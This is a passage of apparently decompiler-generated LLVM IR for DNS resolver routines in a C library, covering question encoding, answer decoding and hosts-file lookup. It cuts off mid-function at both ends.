  store i32 %v2_804da17, i32* %v3_804da19, align 4
  %v0_804da1c = load i32, i32* @ecx, align 4
  %v1_804da1c = add i32 %v0_804da1c, 8
  %v2_804da1c = inttoptr i32 %v1_804da1c to i8*
  %v3_804da1c = load i8, i8* %v2_804da1c, align 1
  %v4_804da1c = zext i8 %v3_804da1c to i32
  %v1_804da20 = add i32 %v0_804da1c, 9
  %v2_804da20 = inttoptr i32 %v1_804da20 to i8*
  %v3_804da20 = load i8, i8* %v2_804da20, align 1
  %v4_804da20 = zext i8 %v3_804da20 to i32
  %v2_804da24 = mul nuw nsw i32 %v4_804da1c, 256
  %v2_804da27 = or i32 %v4_804da20, %v2_804da24
  %v1_804da29 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da29 = add i32 %v1_804da29, 40
  %v3_804da29 = inttoptr i32 %v2_804da29 to i32*
  store i32 %v2_804da27, i32* %v3_804da29, align 4
  %v0_804da2c = load i32, i32* @ecx, align 4
  %v1_804da2c = add i32 %v0_804da2c, 10
  %v2_804da2c = inttoptr i32 %v1_804da2c to i8*
  %v3_804da2c = load i8, i8* %v2_804da2c, align 1
  %v4_804da2c = zext i8 %v3_804da2c to i32
  %v1_804da30 = add i32 %v0_804da2c, 11
  %v2_804da30 = inttoptr i32 %v1_804da30 to i8*
  %v3_804da30 = load i8, i8* %v2_804da30, align 1
  %v4_804da30 = zext i8 %v3_804da30 to i32
  %v2_804da34 = mul nuw nsw i32 %v4_804da2c, 256
  %v2_804da37 = or i32 %v4_804da30, %v2_804da34
  %v1_804da39 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da39 = add i32 %v1_804da39, 44
  %v3_804da39 = inttoptr i32 %v2_804da39 to i32*
  store i32 %v2_804da37, i32* %v3_804da39, align 4
  %v2_804da41 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da41, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_804da44 = load i32, i32* @edi, align 4
  %v0_804da45 = load i32, i32* @esi, align 4
  %v0_804da46 = load i32, i32* @ebx, align 4
  store i32 %v0_804da46, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_804da53 = load i32, i32* @eax, align 4
  %v1_804da56 = inttoptr i32 %tmp to i32*
  %v2_804da56 = load i32, i32* %v1_804da56, align 4
  %v7_804da58 = inttoptr i32 %v2_804da56 to i8*
  %v8_804da58 = call i32 @__encode_dotted(i8* %v7_804da58, i32 %tmp2, i32 %tmp3, i32 %v0_804da53, i32 %v0_804da46, i32 %v0_804da45, i32 %v0_804da44)
  %v2_804da60 = icmp slt i32 %v8_804da58, 0
  store i32 %v8_804da58, i32* @ecx, align 4
  br i1 %v2_804da60, label %dec_label_pc_804da91, label %dec_label_pc_804da66

dec_label_pc_804da66:                             ; preds = %entry
  %v0_804da66 = load i32, i32* @ebx, align 4
  %v2_804da66 = sub i32 %v0_804da66, %v8_804da58
  %v1_804da68 = add i32 %v2_804da66, -3
  %v6_804da68 = sub i32 2, %v2_804da66
  %v7_804da68 = and i32 %v6_804da68, %v2_804da66
  %v8_804da68 = icmp slt i32 %v7_804da68, 0
  %v9_804da68 = icmp eq i32 %v1_804da68, 0
  %v10_804da68 = icmp slt i32 %v1_804da68, 0
  %v3_804da6b = icmp eq i1 %v10_804da68, %v8_804da68
  %v4_804da6b = icmp eq i1 %v9_804da68, false
  %v5_804da6b = and i1 %v4_804da6b, %v3_804da6b
  br i1 %v5_804da6b, label %dec_label_pc_804da72, label %dec_label_pc_804da6d

dec_label_pc_804da6d:                             ; preds = %dec_label_pc_804da66
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_804da91

dec_label_pc_804da72:                             ; preds = %dec_label_pc_804da66
  %v0_804da72 = load i32, i32* @edi, align 4
  %v2_804da72 = add i32 %v0_804da72, %v8_804da58
  store i32 %v2_804da72, i32* @edx, align 4
  %v0_804da75 = load i32, i32* @esi, align 4
  %v1_804da75 = add i32 %v0_804da75, 5
  %v2_804da75 = inttoptr i32 %v1_804da75 to i8*
  %v3_804da75 = load i8, i8* %v2_804da75, align 1
  %v1_804da79 = add i32 %v8_804da58, 4
  store i32 %v1_804da79, i32* @ecx, align 4
  %v3_804da7c = inttoptr i32 %v2_804da72 to i8*
  store i8 %v3_804da75, i8* %v3_804da7c, align 1
  %v0_804da7e = load i32, i32* @esi, align 4
  %v1_804da7e = add i32 %v0_804da7e, 4
  %v2_804da7e = inttoptr i32 %v1_804da7e to i32*
  %v3_804da7e = load i32, i32* %v2_804da7e, align 4
  %v1_804da81 = trunc i32 %v3_804da7e to i8
  %v2_804da81 = load i32, i32* @edx, align 4
  %v3_804da81 = add i32 %v2_804da81, 1
  %v4_804da81 = inttoptr i32 %v3_804da81 to i8*
  store i8 %v1_804da81, i8* %v4_804da81, align 1
  %v0_804da84 = load i32, i32* @esi, align 4
  %v1_804da84 = add i32 %v0_804da84, 9
  %v2_804da84 = inttoptr i32 %v1_804da84 to i8*
  %v3_804da84 = load i8, i8* %v2_804da84, align 1
  %v2_804da88 = load i32, i32* @edx, align 4
  %v3_804da88 = add i32 %v2_804da88, 2
  %v4_804da88 = inttoptr i32 %v3_804da88 to i8*
  store i8 %v3_804da84, i8* %v4_804da88, align 1
  %v0_804da8b = load i32, i32* @esi, align 4
  %v1_804da8b = add i32 %v0_804da8b, 8
  %v2_804da8b = inttoptr i32 %v1_804da8b to i32*
  %v3_804da8b = load i32, i32* %v2_804da8b, align 4
  %v1_804da8e = trunc i32 %v3_804da8b to i8
  %v2_804da8e = load i32, i32* @edx, align 4
  %v3_804da8e = add i32 %v2_804da8e, 3
  %v4_804da8e = inttoptr i32 %v3_804da8e to i8*
  store i8 %v1_804da8e, i8* %v4_804da8e, align 1
  %v0_804da92.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804da91

dec_label_pc_804da91:                             ; preds = %entry, %dec_label_pc_804da6d, %dec_label_pc_804da72
  %v0_804da92 = phi i32 [ %v8_804da58, %entry ], [ -1, %dec_label_pc_804da6d ], [ %v0_804da92.pre, %dec_label_pc_804da72 ]
  %v2_804da91 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804da91, i32* @ebx, align 4
  store i32 %v0_804da44, i32* @edi, align 4
  ret i32 %v0_804da92

; uselistorder directives
  uselistorder i32 %v1_804da68, { 1, 0 }
  uselistorder i32 %v2_804da66, { 0, 2, 1 }
  uselistorder i32 %v8_804da58, { 1, 2, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_804da91, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_804daa3 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_804daa8 = icmp slt i32 %v2_804daa3, 0
  %v1_804daaa = add i32 %v2_804daa3, 4
  %v1_804daad = icmp eq i1 %v2_804daa8, false
  %v4_804daad = select i1 %v1_804daad, i32 %v1_804daaa, i32 %v2_804daa3
  ret i32 %v4_804daad

; uselistorder directives
  uselistorder i32 %v2_804daa3, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804dab4 = load i32, i32* @ebp, align 4
  %v0_804dab5 = load i32, i32* @edi, align 4
  %v0_804dab6 = load i32, i32* @esi, align 4
  %v0_804dab7 = load i32, i32* @ebx, align 4
  store i32 %v0_804dab7, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_804dad8 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804dad8, i32* %eax.global-to-local, align 4
  %v4_804dae5 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_804dad8, i32 256)
  store i32 %v4_804dae5, i32* %eax.global-to-local, align 4
  %v3_804daed = icmp slt i32 %v4_804dae5, 0
  store i32 %v4_804dae5, i32* @edi, align 4
  br i1 %v3_804daed, label %dec_label_pc_804dba0, label %dec_label_pc_804daf7

dec_label_pc_804daf7:                             ; preds = %entry
  %v0_804daf7 = load i32, i32* @ebx, align 4
  %v3_804daf7 = add i32 %v0_804daf7, %v4_804dae5
  %v0_804daf9 = load i32, i32* @esi, align 4
  %v2_804daf9 = sub i32 %v0_804daf9, %v3_804daf7
  %v1_804dafb = add i32 %v2_804daf9, -10
  %v10_804dafb = icmp slt i32 %v1_804dafb, 0
  store i32 %v1_804dafb, i32* @esi, align 4
  %v1_804db06 = icmp eq i1 %v10_804dafb, false
  br i1 %v1_804db06, label %dec_label_pc_804db0f, label %dec_label_pc_804db08

dec_label_pc_804db08:                             ; preds = %dec_label_pc_804daf7
  br label %dec_label_pc_804dba0

dec_label_pc_804db0f:                             ; preds = %dec_label_pc_804daf7
  %v6_804db16 = add i32 %v3_804daf7, %tmp4
  store i32 %v6_804db16, i32* @ebx, align 4
  store i32 %v2_804dad8, i32* %eax.global-to-local, align 4
  %v1_804db22 = bitcast i32* %stack_var_-272 to i8*
  %v2_804db22 = call i32 @__GI_strdup(i8* %v1_804db22)
  store i32 %v2_804db22, i32* %eax.global-to-local, align 4
  %v0_804db27 = load i32, i32* @ebx, align 4
  %v1_804db27 = add i32 %v0_804db27, 4
  store i32 %v1_804db27, i32* %esi.global-to-local, align 4
  %v1_804db2a = load i32, i32* @ebp, align 4
  %v2_804db2a = inttoptr i32 %v1_804db2a to i32*
  store i32 %v2_804db22, i32* %v2_804db2a, align 4
  %v0_804db2d = load i32, i32* @ebx, align 4
  %v1_804db2d = inttoptr i32 %v0_804db2d to i8*
  %v2_804db2d = load i8, i8* %v1_804db2d, align 1
  %v3_804db2d = zext i8 %v2_804db2d to i32
  store i32 %v3_804db2d, i32* %eax.global-to-local, align 4
  %v1_804db30 = add i32 %v0_804db2d, 1
  %v2_804db30 = inttoptr i32 %v1_804db30 to i8*
  %v3_804db30 = load i8, i8* %v2_804db30, align 1
  %v4_804db30 = zext i8 %v3_804db30 to i32
  store i32 %v4_804db30, i32* %edx.global-to-local, align 4
  %v2_804db34 = mul nuw nsw i32 %v3_804db2d, 256
  %v2_804db37 = or i32 %v4_804db30, %v2_804db34
  store i32 %v2_804db37, i32* %eax.global-to-local, align 4
  %v1_804db39 = load i32, i32* @ebp, align 4
  %v2_804db39 = add i32 %v1_804db39, 4
  %v3_804db39 = inttoptr i32 %v2_804db39 to i32*
  store i32 %v2_804db37, i32* %v3_804db39, align 4
  %v0_804db3c = load i32, i32* @ebx, align 4
  %v1_804db3c = add i32 %v0_804db3c, 2
  %v2_804db3c = inttoptr i32 %v1_804db3c to i8*
  %v3_804db3c = load i8, i8* %v2_804db3c, align 1
  %v4_804db3c = zext i8 %v3_804db3c to i32
  store i32 %v4_804db3c, i32* %eax.global-to-local, align 4
  %v1_804db40 = add i32 %v0_804db3c, 3
  %v2_804db40 = inttoptr i32 %v1_804db40 to i8*
  %v3_804db40 = load i8, i8* %v2_804db40, align 1
  %v4_804db40 = zext i8 %v3_804db40 to i32
  store i32 %v4_804db40, i32* %edx.global-to-local, align 4
  %v2_804db44 = mul nuw nsw i32 %v4_804db3c, 256
  %v2_804db47 = or i32 %v4_804db40, %v2_804db44
  store i32 %v2_804db47, i32* %eax.global-to-local, align 4
  %v1_804db49 = load i32, i32* @ebp, align 4
  %v2_804db49 = add i32 %v1_804db49, 8
  %v3_804db49 = inttoptr i32 %v2_804db49 to i32*
  store i32 %v2_804db47, i32* %v3_804db49, align 4
  %v0_804db4c = load i32, i32* @ebx, align 4
  %v1_804db4c = add i32 %v0_804db4c, 4
  %v2_804db4c = inttoptr i32 %v1_804db4c to i8*
  %v3_804db4c = load i8, i8* %v2_804db4c, align 1
  %v4_804db4c = zext i8 %v3_804db4c to i32
  store i32 %v4_804db4c, i32* %edx.global-to-local, align 4
  %v0_804db50 = load i32, i32* %esi.global-to-local, align 4
  %v1_804db50 = add i32 %v0_804db50, 1
  %v2_804db50 = inttoptr i32 %v1_804db50 to i8*
  %v3_804db50 = load i8, i8* %v2_804db50, align 1
  %v4_804db50 = zext i8 %v3_804db50 to i32
  store i32 %v4_804db50, i32* %eax.global-to-local, align 4
  %v1_804db54 = add i32 %v0_804db50, 2
  %v2_804db54 = inttoptr i32 %v1_804db54 to i8*
  %v3_804db54 = load i8, i8* %v2_804db54, align 1
  %v4_804db54 = zext i8 %v3_804db54 to i32
  %v2_804db58 = mul nuw i32 %v4_804db4c, 16777216
  %v2_804db5b = mul nuw nsw i32 %v4_804db50, 65536
  store i32 %v2_804db5b, i32* %eax.global-to-local, align 4
  %v2_804db5e = or i32 %v2_804db5b, %v2_804db58
  store i32 %v2_804db5e, i32* %edx.global-to-local, align 4
  %v1_804db60 = add i32 %v0_804db50, 3
  %v2_804db60 = inttoptr i32 %v1_804db60 to i8*
  %v3_804db60 = load i8, i8* %v2_804db60, align 1
  %v4_804db60 = zext i8 %v3_804db60 to i32
  store i32 %v4_804db60, i32* %eax.global-to-local, align 4
  %v2_804db64 = mul nuw nsw i32 %v4_804db54, 256
  %v2_804db67 = or i32 %v4_804db60, %v2_804db5e
  store i32 %v2_804db67, i32* %edx.global-to-local, align 4
  %v2_804db69 = or i32 %v2_804db67, %v2_804db64
  store i32 %v2_804db69, i32* @ecx, align 4
  %v1_804db6b = load i32, i32* @ebp, align 4
  %v2_804db6b = add i32 %v1_804db6b, 12
  %v3_804db6b = inttoptr i32 %v2_804db6b to i32*
  store i32 %v2_804db69, i32* %v3_804db6b, align 4
  %v0_804db6e = load i32, i32* @ebx, align 4
  %v1_804db6e = add i32 %v0_804db6e, 8
  %v2_804db6e = inttoptr i32 %v1_804db6e to i8*
  %v3_804db6e = load i8, i8* %v2_804db6e, align 1
  %v4_804db6e = zext i8 %v3_804db6e to i32
  store i32 %v4_804db6e, i32* %edx.global-to-local, align 4
  %v1_804db72 = add i32 %v0_804db6e, 9
  %v2_804db72 = inttoptr i32 %v1_804db72 to i8*
  %v3_804db72 = load i8, i8* %v2_804db72, align 1
  %v4_804db72 = zext i8 %v3_804db72 to i32
  store i32 %v4_804db72, i32* %eax.global-to-local, align 4
  %v1_804db76 = add i32 %v0_804db6e, 10
  %v1_804db79 = load i32, i32* @ebp, align 4
  %v2_804db79 = add i32 %v1_804db79, 20
  %v3_804db79 = inttoptr i32 %v2_804db79 to i32*
  store i32 %v1_804db76, i32* %v3_804db79, align 4
  %v0_804db7c = load i32, i32* %edx.global-to-local, align 4
  %v2_804db7c = mul i32 %v0_804db7c, 256
  %v1_804db7f = load i32, i32* %eax.global-to-local, align 4
  %v2_804db7f = or i32 %v1_804db7f, %v2_804db7c
  store i32 %v2_804db7f, i32* @edx, align 4
  %v1_804db81 = load i32, i32* @ebp, align 4
  %v2_804db81 = add i32 %v1_804db81, 16
  %v3_804db81 = inttoptr i32 %v2_804db81 to i32*
  store i32 %v2_804db7f, i32* %v3_804db81, align 4
  %v1_804db8b = add i32 %v3_804daf7, 10
  store i32 %v1_804db8b, i32* %eax.global-to-local, align 4
  %v1_804db8e = load i32, i32* @ebp, align 4
  %v2_804db8e = add i32 %v1_804db8e, 24
  %v3_804db8e = inttoptr i32 %v2_804db8e to i32*
  store i32 %v1_804db8b, i32* %v3_804db8e, align 4
  %v4_804db91 = load i32, i32* @edx, align 4
  %v5_804db95 = icmp slt i32 %v1_804dafb, %v4_804db91
  br i1 %v5_804db95, label %dec_label_pc_804db97, label %dec_label_pc_804db9c

dec_label_pc_804db97:                             ; preds = %dec_label_pc_804db0f
  br label %dec_label_pc_804dba0

dec_label_pc_804db9c:                             ; preds = %dec_label_pc_804db0f
  %v1_804db9c = load i32, i32* @edi, align 4
  %v2_804db9c = add i32 %v4_804db91, 10
  %v3_804db9c = add i32 %v2_804db9c, %v1_804db9c
  br label %dec_label_pc_804dba0

dec_label_pc_804dba0:                             ; preds = %entry, %dec_label_pc_804db97, %dec_label_pc_804db08, %dec_label_pc_804db9c
  %v0_804dba6 = phi i32 [ %v4_804dae5, %entry ], [ -1, %dec_label_pc_804db97 ], [ %v1_804dafb, %dec_label_pc_804db08 ], [ %v3_804db9c, %dec_label_pc_804db9c ]
  store i32 %v0_804dba6, i32* %eax.global-to-local, align 4
  %v2_804dba8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dba8, i32* @ebx, align 4
  store i32 %v0_804dab6, i32* @esi, align 4
  store i32 %v0_804dab5, i32* @edi, align 4
  store i32 %v0_804dab4, i32* @ebp, align 4
  ret i32 %v0_804dba6

; uselistorder directives
  uselistorder i32 %v0_804dba6, { 1, 0 }
  uselistorder i32 %v2_804db5b, { 1, 0 }
  uselistorder i32 %v1_804dafb, { 0, 1, 3, 2 }
  uselistorder i32 %v3_804daf7, { 1, 0, 2 }
  uselistorder i32 %v4_804dae5, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_804dad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dba0, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_804dbbd = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805088d.110 to i32), i32 ptrtoint (i32* @global_var_805083e.89 to i32))
  store i32 %v3_804dbbd, i32* @eax, align 4
  %v1_804dbc5 = icmp eq i32 %v3_804dbbd, 0
  %v1_804dbc7 = icmp eq i1 %v1_804dbc5, false
  br i1 %v1_804dbc7, label %dec_label_pc_804dbdd, label %dec_label_pc_804dbc9

dec_label_pc_804dbc9:                             ; preds = %entry
  %v3_804dbd5 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8050898.111 to i32), i32 ptrtoint (i32* @global_var_805083e.89 to i32))
  br label %dec_label_pc_804dbdd

dec_label_pc_804dbdd:                             ; preds = %entry, %dec_label_pc_804dbc9
  %v0_804dbe0 = phi i32 [ %v3_804dbbd, %entry ], [ %v3_804dbd5, %dec_label_pc_804dbc9 ]
  ret i32 %v0_804dbe0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805083e.89 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_804dbdd, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_804dbe1 = load i32, i32* @ebp, align 4
  %v0_804dbe2 = load i32, i32* @edi, align 4
  %v0_804dbe3 = load i32, i32* @esi, align 4
  %v0_804dbe4 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_804dbf2 = sub i32 0, %arg6
  %v1_804dbf4 = urem i32 %v1_804dbf2, 4
  %v2_804dbf4 = icmp eq i32 %v1_804dbf4, 0
  store i32 %v1_804dbf4, i32* %eax.global-to-local, align 4
  br i1 %v2_804dbf4, label %dec_label_pc_804dc05, label %dec_label_pc_804dbf9

dec_label_pc_804dbf9:                             ; preds = %entry
  %v2_804dbf9 = sub i32 %arg7, %v1_804dbf4
  %v7_804dbf9 = icmp ugt i32 %v1_804dbf4, %arg7
  br i1 %v7_804dbf9, label %dec_label_pc_804dea9, label %dec_label_pc_804dc01

dec_label_pc_804dc01:                             ; preds = %dec_label_pc_804dbf9
  %v2_804dc01 = add i32 %v1_804dbf4, %arg6
  store i32 %v2_804dc01, i32* @ebx, align 4
  store i32 %v2_804dbf9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804dc05

dec_label_pc_804dc05:                             ; preds = %entry, %dec_label_pc_804dc01
  %v0_804dc13 = phi i32 [ %arg6, %entry ], [ %v2_804dc01, %dec_label_pc_804dc01 ]
  %v0_804dc1a = phi i32 [ %arg7, %entry ], [ %v2_804dbf9, %dec_label_pc_804dc01 ]
  %tmp = icmp ult i32 %v0_804dc1a, 32
  br i1 %tmp, label %dec_label_pc_804dea9, label %dec_label_pc_804dc0e

dec_label_pc_804dc0e:                             ; preds = %dec_label_pc_804dc05
  %v12_804dc0e = icmp eq i32 %arg4, 1
  %v1_804dc13 = add i32 %v0_804dc13, 32
  store i32 %v1_804dc13, i32* %eax.global-to-local, align 4
  %v1_804dc1a = add i32 %v0_804dc1a, -32
  store i32 %v1_804dc1a, i32* @ebp, align 4
  br i1 %v12_804dc0e, label %dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge, label %dec_label_pc_804dc23

dec_label_pc_804dc0e.dec_label_pc_804dd59_crit_edge: ; preds = %dec_label_pc_804dc0e
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_804dd59

dec_label_pc_804dc23:                             ; preds = %dec_label_pc_804dc0e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_804dc2a = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_804dc2a, align 4
  %tmp140 = icmp ult i32 %v1_804dc1a, 4
  br i1 %tmp140, label %dec_label_pc_804dea9, label %dec_label_pc_804dc36

dec_label_pc_804dc36:                             ; preds = %dec_label_pc_804dc23
  %v0_804dc36 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dc36 = add i32 %v0_804dc36, -36
  store i32 %v1_804dc36, i32* %eax.global-to-local, align 4
  %tmp141 = icmp ult i32 %v1_804dc36, 8
  br i1 %tmp141, label %dec_label_pc_804dea9, label %dec_label_pc_804dc42

dec_label_pc_804dc42:                             ; preds = %dec_label_pc_804dc36
  %v0_804dc42 = load i32, i32* @ebp, align 4
  %tmp142 = icmp ult i32 %v0_804dc42, 16
  br i1 %tmp142, label %dec_label_pc_804dea9, label %dec_label_pc_804dc4b

dec_label_pc_804dc4b:                             ; preds = %dec_label_pc_804dc42
  %v1_804dc4b = add i32 %v0_804dc36, -48
  store i32 %v1_804dc4b, i32* %eax.global-to-local, align 4
  %tmp143 = icmp ult i32 %v1_804dc4b, 8
  br i1 %tmp143, label %dec_label_pc_804dea9, label %dec_label_pc_804dc57

dec_label_pc_804dc57:                             ; preds = %dec_label_pc_804dc4b
  %v0_804dc57 = load i32, i32* @ebx, align 4
  %v1_804dc57 = add i32 %v0_804dc57, 48
  %v1_804dc5a = add i32 %v0_804dc36, -44
  store i32 %v1_804dc5a, i32* @ebp, align 4
  %v1_804dc61 = add i32 %v0_804dc36, -56
  store i32 %v1_804dc61, i32* @eax, align 4
  %v7_804dc64 = icmp ult i32 %v1_804dc61, %v1_804dc5a
  %v1_804dc66 = add i32 %v0_804dc57, 36
  store i32 %v1_804dc66, i32* @edi, align 4
  br i1 %v7_804dc64, label %dec_label_pc_804dc70, label %dec_label_pc_804dc6b

dec_label_pc_804dc6b:                             ; preds = %dec_label_pc_804dc57
  %v1_804dc6b = add i32 %v0_804dc57, 44
  store i32 %v1_804dc6b, i32* @esi, align 4
  br label %dec_label_pc_804dc75

dec_label_pc_804dc70:                             ; preds = %dec_label_pc_804dc57
  %v1_804dc70 = add i32 %v0_804dc57, 56
  store i32 %v1_804dc70, i32* @esi, align 4
  store i32 %v1_804dc61, i32* @ebp, align 4
  br label %dec_label_pc_804dc75

dec_label_pc_804dc75:                             ; preds = %dec_label_pc_804dc6b, %dec_label_pc_804dc70
  %v0_804dc75 = phi i32 [ %v1_804dc5a, %dec_label_pc_804dc6b ], [ %v1_804dc61, %dec_label_pc_804dc70 ]
  %tmp144 = icmp ult i32 %v0_804dc75, 80
  br i1 %tmp144, label %dec_label_pc_804dea9, label %dec_label_pc_804dc7e

dec_label_pc_804dc7e:                             ; preds = %dec_label_pc_804dc75
  %v0_804dc7e = call i32 @__open_etc_hosts()
  store i32 %v0_804dc7e, i32* %eax.global-to-local, align 4
  %v1_804dc83 = icmp eq i32 %v0_804dc7e, 0
  br i1 %v1_804dc83, label %dec_label_pc_804dcab, label %dec_label_pc_804dc8b

dec_label_pc_804dc8b:                             ; preds = %dec_label_pc_804dc7e
  store i32 %v1_804dc13, i32* %edx.global-to-local, align 4
  store i32 %v1_804dc57, i32* %eax.global-to-local, align 4
  %v0_804dc93 = load i32, i32* @edi, align 4
  %v0_804dc97 = load i32, i32* @esi, align 4
  %v4_804dc9b = inttoptr i32 %v1_804dc13 to i8*
  br label %dec_label_pc_804dd59

dec_label_pc_804dcab:                             ; preds = %dec_label_pc_804dc7e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_804dcaf = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_804dcaf, align 4
  %v1_804dcb5 = call i32 @__errno_location(i32 0)
  store i32 %v1_804dcb5, i32* %eax.global-to-local, align 4
  %v1_804dcba = inttoptr i32 %v1_804dcb5 to i32*
  %v2_804dcba = load i32, i32* %v1_804dcba, align 4
  store i32 %v2_804dcba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dea9

dec_label_pc_804dcc5:                             ; preds = %dec_label_pc_804de2c
  %v2_804dcc5 = load i8*, i8** %stack_var_-44, align 4
  %v3_804dcc5 = ptrtoint i8* %v2_804dcc5 to i32
  store i32 %v3_804dcc5, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_804dccc = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_804dcc5, i32* %v2_804dccc, align 4
  %v0_804dcce = load i32, i32* %eax.global-to-local, align 4
  %v1_804dcce = add i32 %v0_804dcce, 4
  %v2_804dcce = inttoptr i32 %v1_804dcce to i32*
  store i32 0, i32* %v2_804dcce, align 4
  %v0_804dcd5 = load i32, i32* @ebx, align 4
  %v1_804dcd5 = add i32 %v0_804dcd5, 4
  %v2_804dcd5 = inttoptr i32 %v1_804dcd5 to i32*
  %v3_804dcd5 = load i32, i32* %v2_804dcd5, align 4
  store i32 %v3_804dcd5, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_804dcd5, i32* %arg5, align 4
  %v1_804dcde = add i32 %tmp60, 8
  %v2_804dcde = inttoptr i32 %v1_804dcde to i32*
  store i32 2, i32* %v2_804dcde, align 4
  %v0_804dce5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dce5 = add i32 %v0_804dce5, 12
  %v2_804dce5 = inttoptr i32 %v1_804dce5 to i32*
  store i32 4, i32* %v2_804dce5, align 4
  br label %dec_label_pc_804dd1e

dec_label_pc_804dcf2:                             ; preds = %dec_label_pc_804de4e
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_804dcfa = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_804dcfa, align 4
  %v0_804dcfc = load i32, i32* %edx.global-to-local, align 4
  %v1_804dcfc = add i32 %v0_804dcfc, 4
  %v2_804dcfc = inttoptr i32 %v1_804dcfc to i32*
  store i32 0, i32* %v2_804dcfc, align 4
  %v0_804dd03 = load i32, i32* @ebx, align 4
  %v1_804dd03 = add i32 %v0_804dd03, 4
  %v2_804dd03 = inttoptr i32 %v1_804dd03 to i32*
  %v3_804dd03 = load i32, i32* %v2_804dd03, align 4
  store i32 %v3_804dd03, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_804dd03, i32* %arg5, align 4
  %v1_804dd0c = add i32 %tmp60, 8
  %v2_804dd0c = inttoptr i32 %v1_804dd0c to i32*
  store i32 10, i32* %v2_804dd0c, align 4
  %v0_804dd13 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dd13 = add i32 %v0_804dd13, 12
  %v2_804dd13 = inttoptr i32 %v1_804dd13 to i32*
  store i32 16, i32* %v2_804dd13, align 4
  br label %dec_label_pc_804dd1e

dec_label_pc_804dd1e:                             ; preds = %dec_label_pc_804dcc5, %dec_label_pc_804dcf2
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_804dcc5 ], [ %storemerge3, %dec_label_pc_804dcf2 ]
  %v1_804dd1e = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd1e = add i32 %v1_804dd1e, 16
  %v3_804dd1e = inttoptr i32 %v2_804dd1e to i32*
  store i32 %storemerge, i32* %v3_804dd1e, align 4
  %v0_804dd21 = load i32, i32* @ebx, align 4
  %v1_804dd21 = add i32 %v0_804dd21, 8
  %v1_804dd24 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd24 = add i32 %v1_804dd24, 4
  %v3_804dd24 = inttoptr i32 %v2_804dd24 to i32*
  store i32 %v1_804dd21, i32* %v3_804dd24, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_804dd2b = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd2b = inttoptr i32 %arg8 to i32*
  store i32 %v0_804dd2b, i32* %v2_804dd2b, align 4
  br label %dec_label_pc_804de89

